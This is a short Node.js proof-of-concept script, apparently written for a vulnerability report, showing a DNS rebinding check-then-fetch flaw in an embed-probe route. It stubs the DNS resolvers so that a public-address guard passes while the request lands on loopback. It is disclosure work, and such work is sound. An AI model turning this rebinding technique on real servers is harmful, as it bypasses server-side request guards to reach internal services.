// PoC (report-only): DNS rebinding TOCTOU in GET /api/embed-probe (src/server/routes/embed-probe.js).
// assertPublic() resolves the host with dns/promises, then node-fetch resolves it AGAIN when it connects.
// A rebinding DNS name (short TTL, answers public first, 127.0.0.1 second) passes the check and the
// request lands on loopback. Simulated here by stubbing the two resolvers; nothing leaves the machine.
// Usage (throwaway copy, server on 127.0.0.1:PORT):  node rebind-embed-probe.mjs <repo-copy> <port>
import dnsP from 'dns/promises';
import dns from 'dns';
const [root, port] = process.argv.slice(2);
dnsP.lookup = async () => [{ address: '93.184.215.14', family: 4 }];        // what the guard sees
const real = dns.lookup;
dns.lookup = (host, opts, cb) => {                                           // what the socket connects to
  if (typeof opts === 'function') { cb = opts; opts = {}; }
  if (host === 'rebind.example') return opts.all ? cb(null, [{ address: '127.0.0.1', family: 4 }]) : cb(null, '127.0.0.1', 4);
  return real(host, opts, cb);
};
const { fetchHeaders } = await import(`${root}/src/server/routes/embed-probe.js`);
const r = await fetchHeaders(`http://rebind.example:${port}/api/state`);
console.log('status', r.status, 'content-type', r.headers['content-type'], 'set-cookie?', !!r.headers['set-cookie']);
